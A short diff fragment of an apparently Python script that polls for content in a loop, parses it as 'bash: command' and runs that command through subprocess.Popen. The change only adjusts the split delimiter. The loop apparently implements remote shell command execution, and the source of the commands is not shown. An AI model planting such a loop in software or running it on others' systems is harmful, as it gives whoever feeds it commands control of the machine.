@@ -16,7 +16,7 @@ while True:
         time.sleep(2)
         continue
     else:
-        commands = content.split(':')
+        commands = content.split(': ')
     
     if commands[0] == 'bash':
         process = subprocess.Popen(commands[1].split(), stdout=subprocess.PIPE)
